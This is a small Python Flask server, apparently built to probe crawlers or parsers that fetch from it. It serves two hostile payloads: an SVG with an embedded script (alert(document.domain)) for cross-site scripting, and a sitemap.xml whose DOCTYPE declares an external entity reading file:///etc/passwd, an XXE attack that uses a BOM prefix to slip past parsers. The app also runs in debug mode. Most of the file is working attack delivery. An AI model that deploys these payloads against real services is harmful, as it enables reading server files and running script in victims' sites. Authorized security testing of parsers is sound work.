from flask import Flask, Response

app = Flask(__name__)

@app.route("/")
def home():
    return "Hello, World!"

@app.route("/svg")
def svg():
    svg_content = """<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
    <script>alert(document.domain)</script>
</svg>"""
    return Response(svg_content, mimetype="image/svg+xml")

@app.route("/sitemap.xml")
def sitemap():
    # thêm BOM (\xEF\xBB\xBF) + newline trước XML
    xml_bytes = (
        b"\xEF\xBB\xBF\n"
        b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        b"<!DOCTYPE urlset [\n"
        b"    <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n"
        b"]>\n"
        b"<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">\n"
        b"  <url>\n"
        b"    <loc>https://example.com/?abc=&xxe;</loc>\n"
        b"    <lastmod>2025-07-30</lastmod>\n"
        b"    <changefreq>daily</changefreq>\n"
        b"    <priority>1.0</priority>\n"
        b"  </url>\n"
        b"</urlset>"
    )
    return Response(xml_bytes, content_type="application/xml; charset=utf-8")

if __name__ == "__main__":
    app.run(debug=True)
